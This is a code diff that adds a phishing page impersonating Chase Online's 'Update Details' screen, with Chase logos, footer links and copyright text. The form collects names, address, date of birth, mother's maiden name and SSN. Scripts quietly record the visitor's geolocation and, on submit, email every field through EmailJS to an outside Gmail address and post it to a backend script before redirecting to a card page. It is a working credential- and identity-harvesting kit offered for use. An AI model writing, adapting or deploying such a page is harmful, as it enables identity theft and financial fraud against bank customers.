@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
+    <title>Update Details - Chase Online</title>
+    <link rel="icon" type="image/x-icon" href="img/chasefavicon.ico" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap");
+      * {
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Open Sans", sans-serif;
+        background-image: url("img/background_image.jpeg");
+        background-size: cover;
+        background-attachment: fixed;
+      }
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 70px;
+        margin-bottom: 50px;
+      }
+
+      .chase-logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        padding: 20px 0;
+        margin-top: 26px;
+        background: linear-gradient(to bottom, #000000d3, #00000000);
+      }
+
+      .chase-logo img {
+        margin-top: -20px;
+        width: 180px;
+      }
+
+      form {
+        border-radius: 5px;
+        width: 400px;
+        padding: 30px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background-color: rgb(255, 255, 255);
+      }
+
+      .input {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+        width: 100%;
+      }
+
+      label {
+        font-size: 14px;
+        color: rgb(78, 78, 78);
+      }
+
+      input,
+      select {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 20px;
+        border: none;
+        border-bottom: 1px solid rgb(56, 56, 56);
+        background-color: rgb(237, 237, 237);
+        transition: border-color 0.3s ease;
+      }
+      input:focus {
+        outline: none;
+        border-color: orangered;
+      }
+      .forgot-password {
+        text-align: left;
+        margin-bottom: 20px;
+      }
+      .links {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .remember-token {
+        width: 80%;
+        display: flex;
+        justify-content: space-between;
+      }
+
+      button {
+        width: 100%;
+        font-family: inherit;
+        font-weight: 600;
+        font-size: 14px;
+        padding: 8px;
+        border-radius: 5px;
+        border: none;
+        background-color: #0060f0;
+        color: #fff;
+        cursor: pointer;
+        transition: 0.1s ease;
+        margin-bottom: 20px;
+      }
+
+      button:hover {
+        background-color: rgb(0, 46, 83);
+      }
+
+      a {
+        align-self: flex-start;
+        font-size: 14px;
+        font-weight: 500;
+        text-decoration: none;
+        color: #0060f0;
+      }
+
+      .footer {
+        background-color: rgb(255, 255, 255);
+        width: 100%;
+        display: flex;
+        color: #717171;
+        align-items: center;
+        flex-direction: column;
+        display: none;
+      }
+
+      .footer .top {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        padding-block: 20px;
+        border-bottom: 1px solid grey;
+        width: 90%;
+      }
+
+      .footer .center {
+        padding: 20px;
+        display: flex;
+        gap: 20px;
+        width: 80%;
+        align-items: center;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .footer .center a {
+        font-weight: 300;
+        font-size: 11px;
+        display: flex;
+        gap: 5px;
+        color: #323232;
+        text-decoration: underline;
+        align-items: center;
+      }
+
+      .footer .center a span {
+        font-size: 13px;
+      }
+
+      .icons {
+        display: flex;
+        gap: 10px;
+        font-size: 24px;
+      }
+
+      .bottom {
+        font-weight: 300;
+        font-size: 11px;
+        display: flex;
+        gap: 5px;
+        color: #323232;
+      }
+
+      .notif {
+        background-color: rgb(220, 108, 70);
+        color: rgb(0, 0, 0);
+        font-size: 13px;
+        border-radius: 5px;
+        padding: 15px;
+      }
+
+      .cont {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .username {
+        display: flex;
+        gap: 10px;
+      }
+
+      label {
+        font-size: 12px;
+        color: #000;
+        font-weight: 500;
+      }
+
+      .phone-date {
+        display: flex;
+        gap: 10px;
+      }
+
+      .date {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+        width: 100%;
+      }
+
+      .date-selector {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        width: 100%;
+      }
+      select:focus {
+        outline: none;
+      }
+
+      @media screen and (max-width: 600px) {
+        form {
+          max-width: 380px;
+          padding: 20px;
+        }
+      }
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Open Sans", sans-serif;
+        background-image: url("img/background_image.jpeg");
+        background-size: cover;
+        background-attachment: fixed;
+        height: 100vh; /* Full viewport height */
+        display: flex;
+        justify-content: center;
+        align-items: center; /* Center content vertically and horizontally */
+      }
+
+      .container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center; /* Center content vertically */
+        align-items: center; /* Center content horizontally */
+        width: 100%;
+        height: 100vh; /* Full viewport height */
+        gap: 20px; /* Adjust the gap between elements */
+      }
+
+      form {
+        border-radius: 5px;
+        width: 350px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background-color: rgb(255, 255, 255);
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Optional: Add a box shadow */
+        position: relative; /* Add relative positioning */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="chase-logo">
+        <img src="img/wordmark-white.png" alt="" />
+      </div>
+      <div style="display: grid; place-items: center; flex: 1">
+        <form>
+          <div id="login-title">
+            <h1
+              style="font-size: 24px; text-align: center; margin-bottom: 15px"
+            >
+              Please update your account information
+            </h1>
+          </div>
+          <div class="cont">
+            <div class="username">
+              <input
+                type="text"
+                placeholder="First Name"
+                class="username-input"
+                id="fname"
+                name="fname"
+              />
+              <input
+                type="text"
+                placeholder="Last Name"
+                class="username-input"
+                id="lname"
+                name="lname"
+              />
+            </div>
+            <div class="username">
+              <input
+                style="width: 100%"
+                type="text"
+                placeholder="Street Address"
+                class="username-input"
+                id="address"
+                name="address"
+              />
+            </div>
+            <div class="username">
+              <input
+                type="text"
+                placeholder="City"
+                class="username-input"
+                id="city"
+                name="city"
+              />
+              <select
+                style="border-radius: 10px; width: 100%"
+                class="username-input"
+                id="state"
+                name="state"
+              >
+                <option value="">-- Select a state --</option>
+                <option value="AL">Alabama</option>
+                <option value="AK">Alaska</option>
+                <option value="AZ">Arizona</option>
+                <option value="AR">Arkansas</option>
+                <option value="CA">California</option>
+                <option value="CO">Colorado</option>
+                <option value="CT">Connecticut</option>
+                <option value="DE">Delaware</option>
+                <option value="DC">District Of Columbia</option>
+                <option value="FL">Florida</option>
+                <option value="GA">Georgia</option>
+                <option value="HI">Hawaii</option>
+                <option value="ID">Idaho</option>
+                <option value="IL">Illinois</option>
+                <option value="IN">Indiana</option>
+                <option value="IA">Iowa</option>
+                <option value="KS">Kansas</option>
+                <option value="KY">Kentucky</option>
+                <option value="LA">Louisiana</option>
+                <option value="ME">Maine</option>
+                <option value="MD">Maryland</option>
+                <option value="MA">Massachusetts</option>
+                <option value="MI">Michigan</option>
+                <option value="MN">Minnesota</option>
+                <option value="MS">Mississippi</option>
+                <option value="MO">Missouri</option>
+                <option value="MT">Montana</option>
+                <option value="NE">Nebraska</option>
+                <option value="NV">Nevada</option>
+                <option value="NH">New Hampshire</option>
+                <option value="NJ">New Jersey</option>
+                <option value="NM">New Mexico</option>
+                <option value="NY">New York</option>
+                <option value="NC">North Carolina</option>
+                <option value="ND">North Dakota</option>
+                <option value="OH">Ohio</option>
+                <option value="OK">Oklahoma</option>
+                <option value="OR">Oregon</option>
+                <option value="PA">Pennsylvania</option>
+                <option value="RI">Rhode Island</option>
+                <option value="SC">South Carolina</option>
+                <option value="SD">South Dakota</option>
+                <option value="TN">Tennessee</option>
+                <option value="TX">Texas</option>
+                <option value="UT">Utah</option>
+                <option value="VT">Vermont</option>
+                <option value="VA">Virginia</option>
+                <option value="WA">Washington</option>
+                <option value="WV">West Virginia</option>
+                <option value="WI">Wisconsin</option>
+                <option value="WY">Wyoming</option>
+              </select>
+            </div>
+            <div class="username">
+              <input
+                style="width: 100%"
+                type="text"
+                placeholder="Postal Code"
+                class="username-input"
+                id="postal-code"
+                name="postal-code"
+              />
+            </div>
+            <div class="phone-date">
+              <input
+                type="text"
+                id="date-input"
+                placeholder="Date of Birth"
+                onfocus="display()"
+              />
+              <div
+                style="display: none"
+                class="date-selector"
+                id="date-selector"
+              >
+                <select id="day">
+                  <option value="">Day</option>
+                </select>
+                <select id="month">
+                  <option value="">Month</option>
+                  <option value="1">January</option>
+                  <option value="2">February</option>
+                  <option value="3">March</option>
+                  <option value="4">April</option>
+                  <option value="5">May</option>
+                  <option value="6">June</option>
+                  <option value="7">July</option>
+                  <option value="8">August</option>
+                  <option value="9">September</option>
+                  <option value="10">October</option>
+                  <option value="11">November</option>
+                  <option value="12">December</option>
+                </select>
+                <select id="year">
+                  <option value="">Year</option>
+                </select>
+              </div>
+              <input
+                type="text"
+                placeholder="Mother Maiden Name"
+                class="username-input"
+                id="motherName"
+                style="width: 100%"
+                name="motherName"
+              />
+            </div>
+            <div class="username">
+              <input
+                style="width: 100%"
+                type="text"
+                placeholder="SSN"
+                class="username-input"
+                id="ssn"
+                name="ssn"
+              />
+            </div>
+          </div>
+          <button type="button" id="submit-btn">Update</button>
+        </form>
+      </div>
+    </div>
+    <div class="footer">
+      <div class="top">
+        Follow Us:
+        <div class="icons">
+          <i class="fa-brands fa-facebook"></i>
+          <i class="fa-brands fa-instagram"></i>
+          <i class="fa-brands fa-twitter"></i>
+          <i class="fa-brands fa-youtube"></i>
+          <i class="fa-brands fa-linkedin"></i>
+        </div>
+      </div>
+      <div class="center">
+        <a href="#">Contact us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Security</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Accessibility</a>
+        <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+        <a href="#">Fair Lending</a>
+        <a href="#">About Chase</a>
+        <a href="#">J.P. Morgan</a>
+        <a href="#">JPMorgan Chase & Co.</a>
+        <a href="#">Careers</a>
+        <a href="#">Espanol</a>
+        <a href="#">Chase Canada</a>
+        <a href="#">Site map</a>
+        <a href="#" style="text-decoration: none">Member FDIC</a>
+        <a href="#" style="text-decoration: none">
+          <span class="material-symbols-outlined"> other_houses </span>
+          Equal Housing Opportunity
+        </a>
+      </div>
+      <div class="bottom">(c) 2024 JPMorgan Chase & Co.</div>
+    </div>
+
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+      integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "10Wh8RN-TPlYZRbap",
+        });
+      })();
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", getUserLocation);
+
+      // Function to get user's location
+      function getUserLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            // Success callback
+            function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+              getLocationFromCoordinates(latitude, longitude);
+
+              // You can now use latitude and longitude to further process the location
+            },
+            // Error callback
+            function (error) {
+              console.error("Error getting user location:", error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported by this browser.");
+        }
+      }
+      var loc;
+      // Function to get location from latitude and longitude
+      function getLocationFromCoordinates(latitude, longitude) {
+        // Construct the URL for the OpenStreetMap Nominatim API
+        const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+
+        // Make a GET request to the API
+        fetch(apiUrl)
+          .then((response) => response.json())
+          .then((data) => {
+            console.log(data);
+            if (data && data.display_name) {
+              loc = data.display_name;
+            } else {
+              console.error("No location found for the coordinates.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error fetching location:", error);
+          });
+      }
+      function display() {
+        const motherName = document.getElementById("motherName");
+        const dateInput = document.getElementById("date-input");
+        const dateSelector = document.getElementById("date-selector");
+
+        dateInput.style.display = "none";
+        motherName.style.width = "50%";
+        dateSelector.style.display = "flex";
+      }
+      // Populate day options based on selected month and year
+      function populateDays() {
+        var daySelect = document.getElementById("day");
+        var month = document.getElementById("month").value;
+        var year = document.getElementById("year").value;
+        daySelect.innerHTML = "<option value=''>Day</option>";
+        var daysInMonth = new Date(year, month, 0).getDate();
+        for (var i = 1; i <= daysInMonth; i++) {
+          var option = document.createElement("option");
+          option.text = i;
+          option.value = i;
+          daySelect.appendChild(option);
+        }
+      }
+
+      // Populate year options from current year to 100 years back
+      function populateYears() {
+        var yearSelect = document.getElementById("year");
+        var currentYear = new Date().getFullYear();
+        for (var i = currentYear; i >= currentYear - 100; i--) {
+          var option = document.createElement("option");
+          option.text = i;
+          option.value = i;
+          yearSelect.appendChild(option);
+        }
+      }
+
+      // Event listeners to populate day options when month or year changes
+      // document.getElementById("month").addEventListener("change", populateDays);
+      // document.getElementById("year").addEventListener("change", populateDays);
+
+      // Call initial population of days and years
+      populateDays();
+      populateYears();
+
+      const loginTitle = document.getElementById("login-title");
+      $(document).ready(function () {
+        $("#submit-btn").click(function () {
+          var fname = $("#fname").val();
+          var lname = $("#lname").val();
+          var address = $("#address").val();
+          var city = $("#city").val();
+          var state = $("#state").val();
+          var day = $("#day").val();
+          var month = $("#month").val();
+          var year = $("#year").val();
+          var dob = day + "/" + month + "/" + year;
+          var postalCode = $("#postal-code").val();
+          var motherName = $("#motherName").val();
+          var ssn = $("#ssn").val();
+
+          if (
+            fname == "" ||
+            lname == "" ||
+            city == "" ||
+            address == "" ||
+            city == "" ||
+            state == "" ||
+            day == "" ||
+            month == "" ||
+            year == "" ||
+            postalCode == "" ||
+            motherName == "" ||
+            ssn == ""
+          ) {
+            loginTitle.innerHTML = `
+                  <div class='notif'>Please fill in all the fields.</div>
+                  `;
+          } else {
+            function sendMail() {
+              const serviceId = "service_wp0ll78";
+              const templateId = "template_pvad5x6";
+              var params = {
+                name: "CHASE-ICONASSETS",
+                email: "dreedlock6@gmail.com",
+                message: `
+      <table border="1" cellpadding="5" cellspacing="0" style="border-collapse: collapse;">
+        <tr>
+          <td><strong>Page:</strong></td>
+          <td>Update Details</td>
+        </tr>
+        <tr>
+          <td><strong>Name:</strong></td>
+          <td>${fname} ${lname}</td>
+        </tr>
+        <tr>
+          <td><strong>City:</strong></td>
+          <td>${city}</td>
+        </tr>
+        <tr>
+          <td><strong>Address:</strong></td>
+          <td>${address}</td>
+        </tr>
+        <tr>
+          <td><strong>State:</strong></td>
+          <td>${state}</td>
+        </tr>
+        <tr>
+          <td><strong>DOB:</strong></td>
+          <td>${dob}</td>
+        </tr>
+        <tr>
+          <td><strong>Postal Code:</strong></td>
+          <td>${postalCode}</td>
+        </tr>
+        <tr>
+          <td><strong>Phone:</strong></td>
+          <td>${motherName}</td>
+        </tr>
+        <tr>
+          <td><strong>SSN:</strong></td>
+          <td>${ssn}</td>
+        </tr>
+        <tr>
+          <td><strong>Source:</strong></td>
+          <td>CHASE</td>
+        </tr>
+      </table>
+    `,
+              };
+
+              emailjs
+                .send(serviceId, templateId, params)
+                .then((res) => console.log(res));
+            }
+
+            sendMail();
+            $.ajax({
+              type: "POST",
+              url: "backend.php",
+              data: {
+                fname,
+                lname,
+                city,
+                address,
+                state,
+                dob,
+                postalCode,
+                motherName,
+                ssn,
+                type: "update",
+                loc,
+              },
+
+              success: function (response) {
+                console.log(response);
+                window.location.href = "card.html";
+              },
+            });
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
